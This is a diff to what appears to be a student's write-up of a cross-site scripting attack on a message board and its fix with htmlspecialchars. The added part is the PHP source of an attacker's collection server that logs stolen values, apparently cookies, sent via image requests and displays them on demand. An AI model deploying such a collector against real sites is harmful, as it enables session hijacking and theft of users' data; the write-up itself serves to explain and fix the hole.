@@ -34,3 +34,23 @@ If you're on the Taylor University network, you can view the result of this atta
 
 In order to fix this, I disabled all usage of HTML in messages by using the `htmlspecialchars` function in PHP when rendering the user submitted content.
 
+The source code of the attacker server is as follows:
+
+```
+<?php
+$secretFile = "/tmp/foo.txt";
+if (isset($_GET['c'])) {
+	$fh = fopen($secretFile, 'a') or die("can’t open file");	
+	$stringData = $_GET['c']."\n";
+	fwrite($fh, $stringData);
+	fclose($fh);
+
+	//Send an img
+	header("Content-Type: image/png");
+} else {
+	header("Content-Type: text/plain");
+	readfile($secretFile);
+}
+?>
+```
+
